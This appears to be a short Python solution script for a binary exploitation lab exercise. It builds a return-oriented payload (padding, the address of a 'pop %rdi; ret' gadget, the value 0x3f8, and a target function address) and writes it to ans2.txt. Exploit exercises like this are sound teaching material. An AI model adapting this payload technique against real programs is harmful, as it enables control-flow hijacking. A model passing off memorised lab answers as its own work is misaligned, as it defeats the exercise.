import struct

padding = b'A' * 16
pop_addr = 0x4012c7      # pop %rdi; ret的地址
value = 0x3f8           # 要检查的值
func2_addr = 0x401216       # 目标函数


payload = padding
payload += struct.pack('<Q', pop_addr)
payload += struct.pack('<Q', value)
payload += struct.pack('<Q', func2_addr)

with open('ans2.txt', 'wb') as f:
    f.write(payload)
